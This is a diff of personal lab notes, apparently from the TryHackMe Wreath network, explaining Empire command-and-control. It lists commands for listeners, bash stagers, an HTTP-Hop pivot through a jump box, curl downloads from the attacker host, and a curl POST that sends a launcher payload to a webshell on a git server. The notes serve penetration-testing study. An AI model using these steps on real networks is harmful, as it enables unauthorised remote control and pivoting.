@@ -85,26 +85,41 @@ We now have everything we need to get this show on the road!
 
 # Your job
 
-
-
 ![[Command & Control Empire Diagram.svg]]
 
 
-| <center>Actions</center>                                                 | <center>Machine</center> | <center>Commands</center>                                                                                             |
-| ------------------------------------------------------------------------ | ------------------------ | --------------------------------------------------------------------------------------------------------------------- |
-| Start Empire Server                                                      | Attacking Machine        | `powershell-empire server`                                                                                            |
-| Start Empire CLI                                                         | Attacking Machine        | `powershell-empire client`                                                                                            |
-| Setup HTTP Listener                                                      | Empire CLI               | `uselistener http`                                                                                                    |
-| Create a listener                                                        | Empire CLI               | [[Empire - Listeners]]                                                                                                |
-| Setup Stager                                                             | Empire CLI               | `usestager multi_bash`<br>`set Listener CLIHTTP`<br>`execute`                                                         |
-| Execute stager on target                                                 | Jump box .200            | `echo "import sys,base64,warnings...`                                                                                 |
-| Open firewall port                                                       | Jump box .200            | `firewall-cmd --zone=public --add-port 47000/tcp`                                                                     |
-| Creating hop jump server                                                 | Empire CLI               | `uselistener http_hop`<br>`set Host 10.200.X.200` <br>`set Port 47000`<br>`set RedirectListener CLIHTTP`<br>`execute` |
-| Zip and transfer files `/tmp/http_hop` to jump box target                | Attacking Machine        | `cd /tmp/http_hop && zip -r hop.zip`<br>`sudo python3 -m http.server 80`                                              |
-| Download on target                                                       | Jump box .200            | `curl 10.50.X.X/hop.zip -o hop.zip unzip hop.zip`                                                                     |
-| Create http_hop stager                                                   | Empire CLI               | `usestager multi_launcher`<br>`set Listener http_hop` `execute`                                                       |
-| Setup a PHP Server to host http_hop files                                | Jump box .200            | `php -S 0.0.0.0:47000`                                                                                                |
-| Connect to `git-server` on `.150` and execute `usestager/multi/launcher` |                          |                                                                                                                       |
+The way this system works is:
+- There is a **command server**, usually your Attacking Machine.
+- This command server has a listener or number of listeners on it, waiting for connections from your agents. 
+- These listeners come in various options but the most used ones are HTTP and *HTTP-Hop* mainly because they can blend into normal day-to-day traffic easier.
+
+**HTTP-Hop**
+This is a special listener because it allows you to set up a hop station should you be pivoting around a network. What this essentially does is allows us to take an entry point in the network and make use of it as a “jump” server between our command server and a compromised device that doesn’t have internet connectivity for example:
+
+**Command Server <—–> Web Server <—-> Compromised Machine**
+
+The next part is the **stager**.
+- This is a script/command that creates our agent. 
+- This comes in a number of forms but *Bash* and *Powershell* are the ones introduced in the Wreath room. 
+- Once these stagers are run on your compromised machine they will create an **agent** connection back to your control server. 
+- Once connected you will be able to run commands as if you were on the agent through the command server.
+
+| <center>Actions</center>                                                          | <center>Machine</center> | <center>Commands</center>                                                                                             |
+| --------------------------------------------------------------------------------- | ------------------------ | --------------------------------------------------------------------------------------------------------------------- |
+| Start Empire Server                                                               | Attacking Machine        | `powershell-empire server`                                                                                            |
+| Start Empire CLI                                                                  | Attacking Machine        | `powershell-empire client`                                                                                            |
+| Setup HTTP Listener                                                               | Empire CLI               | `uselistener http`                                                                                                    |
+| Create a listener                                                                 | Empire CLI               | [[Empire - Listeners]]                                                                                                |
+| Setup Stager                                                                      | Empire CLI               | `usestager multi_bash`<br>`set Listener CLIHTTP`<br>`execute`                                                         |
+| Execute stager on target                                                          | Jump box .200            | `echo "import sys,base64,warnings...`                                                                                 |
+| Open firewall port                                                                | Jump box .200            | `firewall-cmd --zone=public --add-port 47000/tcp`                                                                     |
+| Creating hop jump server                                                          | Empire CLI               | `uselistener http_hop`<br>`set Host 10.200.X.200` <br>`set Port 47000`<br>`set RedirectListener CLIHTTP`<br>`execute` |
+| Zip and transfer files `/tmp/http_hop` to jump box target                         | Attacking Machine        | `cd /tmp/http_hop && zip -r hop.zip`<br>`sudo python3 -m http.server 80`                                              |
+| Download on target                                                                | Jump box .200            | `curl 10.50.X.X/hop.zip -o hop.zip unzip hop.zip`                                                                     |
+| Create http_hop stager                                                            | Empire CLI               | `usestager multi_launcher`<br>`set Listener http_hop` `execute`                                                       |
+| Setup a PHP Server to host http_hop files                                         | Jump box .200            | `php -S 0.0.0.0:47000`                                                                                                |
+| Connect to `git-server` on `.150` and execute `usestager/multi_launcher` payload. | Attacking Machine        | `curl -X POST http://10.200.84.150/web/exploit-KAIROS.php -d "a=<usestager/multi_launcher payload"`<br>               |
+|                                                                                   |                          |                                                                                                                       |
 After completing the given steps, we have an agent from the Git Server in Starkiller.
 
 ![[Git Server-20250114152251549.webp]]
